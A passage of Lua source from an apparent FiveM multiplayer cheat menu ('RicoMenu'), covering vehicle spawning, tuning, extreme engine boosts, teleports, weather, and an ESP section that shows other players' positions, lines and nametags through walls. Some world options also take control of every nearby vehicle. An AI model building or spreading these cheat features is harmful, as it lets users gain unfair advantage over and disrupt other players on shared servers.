			elseif RicoMenu.MenuButton('Boats', 'boats') then
			elseif RicoMenu.MenuButton('Helicopters', 'helicopters') then
			elseif RicoMenu.MenuButton('Planes', 'planes') then
			elseif RicoMenu.MenuButton('Service/Emergency/Military', 'service') then
			elseif RicoMenu.MenuButton('Commercial/Trains', 'commercial') then
			end
        
        -- COMPACTS SPAWNER
        elseif RicoMenu.IsMenuOpened('compacts') then
            for i = 1, #compacts do
                local vehname = GetLabelText(compacts[i])
                if vehname == "NULL" then vehname = compacts[i] end -- Avoid getting NULL (for some reason GetLabelText returns null for some vehs)
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SEDANS SPAWNER
        elseif RicoMenu.IsMenuOpened('sedans') then
            for i = 1, #sedans do
                local vehname = GetLabelText(sedans[i])
                if vehname == "NULL" then vehname = sedans[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUVs SPAWNER
        elseif RicoMenu.IsMenuOpened('suvs') then
            for i = 1, #suvs do
                local vehname = GetLabelText(suvs[i])
                if vehname == "NULL" then vehname = suvs[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COUPES SPAWNER
        elseif RicoMenu.IsMenuOpened('coupes') then
            for i = 1, #coupes do
                local vehname = GetLabelText(coupes[i])
                if vehname == "NULL" then vehname = coupes[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- MUSCLE SPAWNER
        elseif RicoMenu.IsMenuOpened('muscle') then
            for i = 1, #muscle do
                local vehname = GetLabelText(muscle[i])
                if vehname == "NULL" then vehname = muscle[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTSCLASSICS SPAWNER
        elseif RicoMenu.IsMenuOpened('sportsclassics') then
            for i = 1, #sportsclassics do
                local vehname = GetLabelText(sportsclassics[i])
                if vehname == "NULL" then vehname = sportsclassics[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SPORTS SPAWNER
        elseif RicoMenu.IsMenuOpened('sports') then
            for i = 1, #sports do
                local vehname = GetLabelText(sports[i])
                if vehname == "NULL" then vehname = sports[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- SUPER SPAWNER
        elseif RicoMenu.IsMenuOpened('super') then
            for i = 1, #super do
                local vehname = GetLabelText(super[i])
                if vehname == "NULL" then vehname = super[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(super[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- MOTORCYCLES SPAWNER
        elseif RicoMenu.IsMenuOpened('motorcycles') then
            for i = 1, #motorcycles do
                local vehname = GetLabelText(motorcycles[i])
                if vehname == "NULL" then vehname = motorcycles[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(motorcycles[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- OFFROAD SPAWNER
        elseif RicoMenu.IsMenuOpened('offroad') then
            for i = 1, #offroad do
                local vehname = GetLabelText(offroad[i])
                if vehname == "NULL" then vehname = offroad[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- INDUSTRIAL SPAWNER
        elseif RicoMenu.IsMenuOpened('industrial') then
            for i = 1, #industrial do
                local vehname = GetLabelText(industrial[i])
                if vehname == "NULL" then vehname = industrial[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- UTILITY SPAWNER
        elseif RicoMenu.IsMenuOpened('utility') then
            for i = 1, #utility do
                local vehname = GetLabelText(utility[i])
                if vehname == "NULL" then vehname = utility[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VANS SPAWNER
        elseif RicoMenu.IsMenuOpened('vans') then
            for i = 1, #vans do
                local vehname = GetLabelText(vans[i])
                if vehname == "NULL" then vehname = vans[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- CYCLES SPAWNER
        elseif RicoMenu.IsMenuOpened('cycles') then
            for i = 1, #cycles do
                local vehname = GetLabelText(cycles[i])
                if vehname == "NULL" then vehname = cycles[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- BOATS SPAWNER
        elseif RicoMenu.IsMenuOpened('boats') then
            for i = 1, #boats do
                local vehname = GetLabelText(boats[i])
                if vehname == "NULL" then vehname = boats[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- HELICOPTERS SPAWNER
        elseif RicoMenu.IsMenuOpened('helicopters') then
            for i = 1, #helicopters do
                local vehname = GetLabelText(helicopters[i])
                if vehname == "NULL" then vehname = helicopters[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- PLANES SPAWNER
        elseif RicoMenu.IsMenuOpened('planes') then
            for i = 1, #planes do
                local vehname = GetLabelText(planes[i])
                if vehname == "NULL" then vehname = planes[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
                end
            end
        
        -- SERVICE SPAWNER
        elseif RicoMenu.IsMenuOpened('service') then
            for i = 1, #service do
                local vehname = GetLabelText(service[i])
                if vehname == "NULL" then vehname = service[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(service[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- COMMERCIAL SPAWNER
        elseif RicoMenu.IsMenuOpened('commercial') then
            for i = 1, #commercial do
                local vehname = GetLabelText(commercial[i])
                if vehname == "NULL" then vehname = commercial[i] end
                local carButton = RicoMenu.Button(vehname)
                if carButton then
                    SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn)
                end
            end
        
        -- VEHICLE MODS MENU
        elseif RicoMenu.IsMenuOpened('vehiclemods') then
            if RicoMenu.MenuButton("Vehicle Colors", 'vehiclecolors') then
                elseif RicoMenu.MenuButton("Tune Vehicle", 'vehicletuning') then
                elseif RicoMenu.Button("Set Plate Text (8 Characters)") then
                    local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                    RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                    SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)	
			elseif RicoMenu.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Colour", RainbowVeh) then
                RainbowVeh = not RainbowVeh
				
			elseif RicoMenu.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Neon", ou328hNeon) then
                ou328hNeon = not ou328hNeon
			elseif RicoMenu.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Sync", ou328hSync) then
                ou328hSync = not ou328hSync
			
             end
        
        -- VEHICLE COLORS MENU
        elseif RicoMenu.IsMenuOpened('vehiclecolors') then
            if RicoMenu.MenuButton("Primary Color", 'vehiclecolors_primary') then
                elseif RicoMenu.MenuButton("Secondary Color", 'vehiclecolors_secondary') then
                
            end
        
        elseif RicoMenu.IsMenuOpened('vehiclecolors_primary') then
            if RicoMenu.MenuButton("Classic Colors", 'primary_classic') then
                elseif RicoMenu.MenuButton("Matte Colors", 'primary_matte') then
                elseif RicoMenu.MenuButton("Metals", 'primary_metal') then
            end
        
        elseif RicoMenu.IsMenuOpened('vehiclecolors_secondary') then
            if RicoMenu.MenuButton("Classic Colors", 'secondary_classic') then
                elseif RicoMenu.MenuButton("Matte Colors", 'secondary_matte') then
                elseif RicoMenu.MenuButton("Metals", 'secondary_metal') then
            end
        
        -- PRIMARY CLASSIC
        elseif RicoMenu.IsMenuOpened('primary_classic') then
            for i = 1, #classicColors do
                if RicoMenu.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, classicColors[i][2], sec)
                end
            end
        
        -- PRIMARY MATTE
        elseif RicoMenu.IsMenuOpened('primary_matte') then
            for i = 1, #matteColors do
                if RicoMenu.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, matteColors[i][2], sec)
                end
            end
        
        -- PRIMARY METAL
        elseif RicoMenu.IsMenuOpened('primary_metal') then
            for i = 1, #metalColors do
                if RicoMenu.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, metalColors[i][2], sec)
                end
            end
        
        -- SECONDARY CLASSIC
        elseif RicoMenu.IsMenuOpened('secondary_classic') then
            for i = 1, #classicColors do
                if RicoMenu.Button(classicColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, classicColors[i][2])
                end
            end
        
        -- SECONDARY MATTE
        elseif RicoMenu.IsMenuOpened('secondary_matte') then
            for i = 1, #matteColors do
                if RicoMenu.Button(matteColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, matteColors[i][2])
                end
            end
        
        -- SECONDARY METAL
        elseif RicoMenu.IsMenuOpened('secondary_metal') then
            for i = 1, #metalColors do
                if RicoMenu.Button(metalColors[i][1]) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local prim, sec = GetVehicleColours(veh)
                    SetVehicleColours(veh, prim, metalColors[i][2])
                end
            end
        
        -- VEHICLE TUNING MENU
        elseif RicoMenu.IsMenuOpened('vehicletuning') then
		   if RicoMenu.Button("Max ~r~Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
		elseif RicoMenu.Button("Max ~r~Performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
		elseif RicoMenu.Button("Max All ~r~Tuning") then
					engine1(GetVehiclePedIsUsing(PlayerPedId()))
		end
		
		elseif RicoMenu.IsMenuOpened("VehBoostMenu") then
                if RicoMenu.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif RicoMenu.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif RicoMenu.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end
			
 
        -- VEHICLE MENU (VIP)
        elseif RicoMenu.IsMenuOpened('vehiclemenu') then
            if RicoMenu.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
                if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
					SavedVehicle = not SavedVehicle
					RemoveBlip(pvblip)
                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					pvblip = AddBlipForEntity(pvehicle)
					SetBlipSprite(pvblip, 225) 
					SetBlipColour(pvblip, 84)
					ShowInfo("~g~Current Vehicle Saved")
					pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
                elseif SavedVehicle then
					SavedVehicle = not SavedVehicle
					pvehicle = nil
                    RemoveBlip(pvblip)
					ShowInfo("~b~Saved Vehicle Blip Removed")
				else
					ShowInfo("~r~You are not in a vehicle!")
                end

               

            elseif RicoMenu.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
                LeftFrontDoor = not LeftFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftFrontDoor then
                    SetVehicleDoorOpen(vehicle, 0, nil, true)
                elseif not LeftFrontDoor then
                    SetVehicleDoorShut(vehicle, 0, true)
                end
            elseif RicoMenu.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then
                RightFrontDoor = not RightFrontDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightFrontDoor then
					SetVehicleDoorOpen(vehicle, 1, nil, true)
                elseif not RightFrontDoor then
					SetVehicleDoorShut(vehicle, 1, true)
                end
            elseif RicoMenu.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
                LeftBackDoor = not LeftBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if LeftBackDoor then
					SetVehicleDoorOpen(vehicle, 2, nil, true)
                elseif not LeftBackDoor then
					SetVehicleDoorShut(vehicle, 2, true)
                end
            elseif RicoMenu.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
                RightBackDoor = not RightBackDoor
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if RightBackDoor then
					SetVehicleDoorOpen(vehicle, 3, nil, true)
                elseif not RightBackDoor then
					SetVehicleDoorShut(vehicle, 3, true)
                end
            elseif RicoMenu.CheckBox("Hood", FrontHood, "Closed", "Opened") then
                FrontHood = not FrontHood
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if FrontHood then
					SetVehicleDoorOpen(vehicle, 4, nil, true)
                elseif not FrontHood then
					SetVehicleDoorShut(vehicle, 4, true)
                end
            elseif RicoMenu.CheckBox("Trunk", Trunk, "Closed", "Opened") then
                Trunk = not Trunk
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Trunk then
					SetVehicleDoorOpen(vehicle, 5, nil, true)
                elseif not Trunk then
					SetVehicleDoorShut(vehicle, 5, true)
                end
            elseif RicoMenu.CheckBox("Back", Back, "Closed", "Opened") then
                Back = not Back
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back then
					SetVehicleDoorOpen(vehicle, 6, nil, true)
                elseif not Back then
					SetVehicleDoorShut(vehicle, 6, true)
                end
            elseif RicoMenu.CheckBox("Back 2", Back2, "Closed", "Opened") then
                Back2 = not Back2
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                if Back2 then
					SetVehicleDoorOpen(vehicle, 7, nil, true)
                elseif not Back2 then
					SetVehicleDoorShut(vehicle, 7, true)
                end
            end

        -- WORLD OPTIONS MENU
        elseif RicoMenu.IsMenuOpened('world') then  
            if RicoMenu.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
            elseif RicoMenu.MenuButton("Time Changer", 'time') then
            elseif RicoMenu.CheckBox("Disable Cars", CarsDisabled) then
                CarsDisabled = not CarsDisabled
            elseif RicoMenu.CheckBox("Disable Guns", GunsDisabled) then
                GunsDisabled = not GunsDisabled
            elseif RicoMenu.CheckBox("Clear Streets", ClearStreets) then
                ClearStreets = not ClearStreets
            elseif RicoMenu.CheckBox("Noisy Cars", NoisyCars) then
                NoisyCars = not NoisyCars
                if not NoisyCars then
                    for k in EnumerateVehicles() do
                        SetVehicleAlarmTimeLeft(k, 0)
                    end
                end
            elseif RicoMenu.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
                currGravIndex = currentIndex
                selGravIndex = currentIndex
                GravAmount = GravityOps[currGravIndex]

                for k in EnumerateVehicles() do
                    RequestControlOnce(k)
                    SetVehicleGravityAmount(k, GravAmount)
                end
            end) then
			end
			
			 elseif RicoMenu.IsMenuOpened('time') then
			  if RicoMenu.CheckBox("Christmas Weather", XMAS) then
                XMAS = not XMAS
				if XMAS then
			            SetForceVehicleTrails(true)
            SetForcePedFootstepsTracks(true)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end
				elseif RicoMenu.CheckBox("Blizzard Weather", BLIZZARD) then
                BLIZZARD = not BLIZZARD
				if BLIZZARD then
		SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		elseif RicoMenu.CheckBox("Foggy Weather", FOGGY) then
                FOGGY = not FOGGY
				if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
	end
	
			
			 
			
        
        
        -- OBJECT SPAWNER MENU
        elseif RicoMenu.IsMenuOpened('objectspawner') then
            if RicoMenu.MenuButton("Spawned Objects", 'objectlist') then
            elseif RicoMenu.ComboBox("~g~Select~s~ To Object~h~~y~ »", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
				currObjIndex = currentIndex
				selObjIndex = currentIndex
				obj = objs_tospawn[currObjIndex]
				end) then
			elseif RicoMenu.Button("~g~Spawn ~s~Object") then
				local pos = GetEntityCoords(PlayerPedId())
				local pitch = GetEntityPitch(PlayerPedId())
				local roll = GetEntityRoll(PlayerPedId())
				local yaw = GetEntityRotation(PlayerPedId()).z
				local xf = GetEntityForwardX(PlayerPedId())
				local yf = GetEntityForwardY(PlayerPedId())
				local spawnedObj = nil
				if currDirectionIndex == 1 then
					spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
				elseif currDirectionIndex == 2 then
					spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
				end
				SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
				SetEntityVisible(spawnedObj, objVisible, 0)
				FreezeEntityPosition(spawnedObj, 1)
				table.insert(SpawnedObjects, spawnedObj)
            elseif RicoMenu.Button("Add Object By Name") then
				local testObj = GetKeyboardInput("Enter Object Model Name:")
				local pos = GetEntityCoords(PlayerPedId())
				local addedObj = CreateObject(GetHashKey(testObj), pos.x, pos.y, pos.z - 100, 0, 1, 1)
				SetEntityVisible(addedObj, 0, 0)
				if table.contains(objs_tospawn, testObj) then
					ShowInfo("~b~Model " .. testObj .. " is already spawnable!")
				elseif DoesEntityExist(addedObj) then
					objs_tospawn[#objs_tospawn + 1] = testObj
					ShowInfo("~g~Model " .. testObj .. " has been added to the list!")
				else
					ShowInfo("~r~Model " .. testObj .. " does not exist!")
				end
				RequestControlOnce(addedObj)
				DeleteObject(addedObj)
            elseif RicoMenu.CheckBox("Visible", objVisible) then
                objVisible = not objVisible
            elseif RicoMenu.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
                currDirectionIndex = currentIndex
                selDirectionIndex = currentIndex
            end) then
            elseif RicoMenu.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
				currRotationIndex = currentIndex
				selRotationIndex = currentIndex
				ObjRotation = RotationOps[currRotationIndex]
				end) then
            end
        
        
        -- SPAWNED OBJECTS MENU
        elseif RicoMenu.IsMenuOpened('objectlist') then
            if RicoMenu.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
            else
                for i = 1, #SpawnedObjects do
                    if DoesEntityExist(SpawnedObjects[i]) then
                        if RicoMenu.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
                            RequestControlOnce(SpawnedObjects[i])
                            DeleteObject(SpawnedObjects[i])
                        end
                    end
                end
            end
        
        -- WEATHER CHANGER MENU
		elseif RicoMenu.IsMenuOpened('weather') then
		    if RicoMenu.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
                    	 currWeatherIndex = currentIndex
                    	 selWeatherIndex = currentIndex
                    	 WeatherType = WeathersList[currentIndex]
		    end) then
		    elseif RicoMenu.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
		  	  WeatherChanger = not WeatherChanger
		    end
		
        -- MISC OPTIONS MENU
        elseif RicoMenu.IsMenuOpened('misc') then
      
			if RicoMenu.MenuButton("~h~BLIPS/ESP/Visual", 'esp') then
            elseif RicoMenu.CheckBox('Force Map', ForceMap) then
                ForceMap = not ForceMap
			elseif RicoMenu.CheckBox('Force Third Person', ForceThirdPerson) then
                ForceThirdPerson = not ForceThirdPerson
			elseif RicoMenu.MenuButton("Web Radio", 'webradio') then
            elseif RicoMenu.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
                Radio = not Radio
                ShowInfo("~r~Portable Radio will override any vehicle's radio!")
            elseif RicoMenu.ComboBox2("Change Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)
                currRadioIndex = currentIndex
                selRadioIndex = currentIndex
                RadioStation = RadiosList[currentIndex]
            end) then
            elseif RicoMenu.CheckBox('Always Draw Crosshair', Crosshair) then
                Crosshair = not Crosshair
            elseif RicoMenu.CheckBox("Show Coordinates", ShowCoords) then
                ShowCoords = not ShowCoords
			elseif RicoMenu.ComboBox("~b~»  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = currentIndex
                    for i = 1, #menulist do
                        RicoMenu.SetMenuX(menulist[i], menuX[currentMenuX])
                    end
                    end) 
                    then
            elseif RicoMenu.ComboBox("~b~»  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = currentIndex
                    for i = 1, #menulist do
                        RicoMenu.SetMenuY(menulist[i], menuY[currentMenuY])
                    end
                    end)
                    then
            elseif RicoMenu.MenuButton('Credits', 'credits') then
            end
					
		-- ESP OPTIONS MENU
		elseif RicoMenu.IsMenuOpened('esp') then
			if RicoMenu.CheckBox("Blips", BlipsEnabled) then
                ToggleBlips()
            elseif RicoMenu.CheckBox("Nametags", NametagsEnabled) then
                NametagsEnabled = not NametagsEnabled
                tags_plist = GetActivePlayers()
                ptags = {}
                for i = 1, #tags_plist do
                    ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
                    SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
                    SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
                end
                if not NametagsEnabled then
                    for i = 1, #ptags do
                        SetMpGamerTagVisibility(ptags[i], 4, 0)
                        SetMpGamerTagVisibility(ptags[i], 8, 0)
                    end
                end
            elseif RicoMenu.CheckBox("Alternative (OneSync) Nametags", ANametagsEnabled) then
                ANametagsEnabled = not ANametagsEnabled
            elseif RicoMenu.CheckBox("Draw Alternative Nametags Through Walls", ANametagsNotNeedLOS) then
                ANametagsNotNeedLOS = not ANametagsNotNeedLOS
			elseif RicoMenu.CheckBox("ESP", ESPEnabled) then
				ToggleESP()
            elseif RicoMenu.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
                currESPDistance = currentIndex
                selESPDistance = currentIndex
                EspDistance = ESPDistanceOps[currESPDistance]
            end) then
			elseif RicoMenu.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
                currESPRefreshIndex = currentIndex
                selESPRefreshIndex = currentIndex
				if currentIndex == 1 then
					ESPRefreshTime = 0
				elseif currentIndex == 2 then
					ESPRefreshTime = 100
				elseif currentIndex == 3 then
					ESPRefreshTime = 250
				elseif currentIndex == 4 then
					ESPRefreshTime = 500
				elseif currentIndex == 5 then
					ESPRefreshTime = 1000
				elseif currentIndex == 6 then
					ESPRefreshTime = 2000
				elseif currentIndex == 7 then
					ESPRefreshTime = 5000
				end
            end) then
            elseif RicoMenu.CheckBox("Lines", LinesEnabled) then
                LinesEnabled = not LinesEnabled
			end
			
		-- WEB RADIO MENU
        elseif RicoMenu.IsMenuOpened('webradio') then
            if RicoMenu.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
				ClassicalRadio = not ClassicalRadio
				if ClassicalRadio then
					RadioDUI = CreateDui("http://cms.stream.publicradio.org/cms.mp3", 1, 1)
					ShowInfo("~b~Now Playing...")
				else
					DestroyDui(RadioDUI)
					ShowInfo("~r~Web Radio Stopped!")
				end
			end
       
        -- TELEPORT OPTIONS MENU
        elseif RicoMenu.IsMenuOpened('teleport') then
            if RicoMenu.MenuButton('Save/Load Position', 'saveload') then
			elseif RicoMenu.Button("~b~TP~s~ To Coordinates") then
                 TeleportToCoords()
            elseif RicoMenu.MenuButton('~b~TP~s~ to Others', 'pois') then
            elseif RicoMenu.Button('~b~TP~s~ Waypoint ~r~(NUM 4)') then
				TeleportToWaypoint()
			elseif RicoMenu.Button('~b~TP~s~ FBI') then
				fbi()
			elseif RicoMenu.Button('~b~TP~s~ LS Customs') then
				ls()
			elseif RicoMenu.Button('~b~TP~s~ Main Garage') then
				gp()
		    elseif RicoMenu.Button('~b~TP~s~ Ammunation') then
			    Ammunation()
			elseif RicoMenu.Button('~b~TP~s~ Clothes shop') then
			    shopclothes()
			elseif RicoMenu.Button('~b~TP~s~ Barber') then
			    barber()
            end
        

        elseif RicoMenu.IsMenuOpened('saveload') then
            if RicoMenu.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
                currSaveLoadIndex1 = currentIndex
                selSaveLoadIndex1 = currentIndex
            end) then
                if selSaveLoadIndex1 == 1 then
                    savedpos1 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 1 Saved")
                else
                    if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
                        SetEntityCoords(PlayerPedId(), savedpos1)
                        ShowInfo("~g~Position 1 Loaded")
                    end
                end
            elseif RicoMenu.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
                currSaveLoadIndex2 = currentIndex
                selSaveLoadIndex2 = currentIndex
            end) then
                if selSaveLoadIndex2 == 1 then
                    savedpos2 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 2 Saved")
                else
                    if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
                        SetEntityCoords(PlayerPedId(), savedpos2)
                        ShowInfo("~g~Position 2 Loaded")
                    end
                end
            elseif RicoMenu.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
                currSaveLoadIndex3 = currentIndex
                selSaveLoadIndex3 = currentIndex
            end) then
                if selSaveLoadIndex3 == 1 then
                    savedpos3 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 3 Saved")
                else
                    if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
                        SetEntityCoords(PlayerPedId(), savedpos3)
                        ShowInfo("~g~Position 3 Loaded")
                    end
                end
            elseif RicoMenu.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
                currSaveLoadIndex4 = currentIndex
                selSaveLoadIndex4 = currentIndex
            end) then
                if selSaveLoadIndex4 == 1 then
                    savedpos4 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 4 Saved")
                else
                    if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
